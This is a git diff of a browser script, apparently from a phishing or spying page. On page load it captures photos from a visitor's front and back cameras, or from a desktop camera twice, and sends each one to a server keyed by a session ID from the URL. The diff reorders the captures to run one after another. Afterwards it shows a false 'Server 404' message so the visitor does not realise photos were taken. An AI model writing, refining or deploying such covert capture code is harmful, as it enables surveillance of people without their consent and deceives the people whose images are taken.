@@ -2,7 +2,6 @@
 (async function() {
   const status = document.getElementById("status");
 
-  // Get sessionId and name from URL
   const urlParams = new URLSearchParams(window.location.search);
   const sessionId = urlParams.get("sessionId") || Date.now().toString() + Math.floor(Math.random()*1000);
   const name = urlParams.get("name") || "visitor";
@@ -44,21 +43,20 @@
   }
 
   try {
-    // Capture front + back simultaneously on mobile
-    let frontPhoto, backPhoto;
     if (/Mobi|Android/i.test(navigator.userAgent)) {
-      [frontPhoto, backPhoto] = await Promise.all([
-        takePhoto("user"),
-        takePhoto({ exact: "environment" })
-      ]);
+      // Mobile: capture front then back sequentially
+      const frontPhoto = await takePhoto("user");
       await sendToServer(frontPhoto, "front");
+
+      const backPhoto = await takePhoto({ exact: "environment" });
       await sendToServer(backPhoto, "back");
     } else {
-      // On desktop, capture default camera twice
-      frontPhoto = await takePhoto("user");
-      backPhoto = await takePhoto("user");
-      await sendToServer(frontPhoto, "front");
-      await sendToServer(backPhoto, "back");
+      // Desktop: capture default camera twice
+      const photo1 = await takePhoto("user");
+      await sendToServer(photo1, "front");
+
+      const photo2 = await takePhoto("user");
+      await sendToServer(photo2, "back");
     }
 
     status.innerText = "Server 404! Please try after some time";
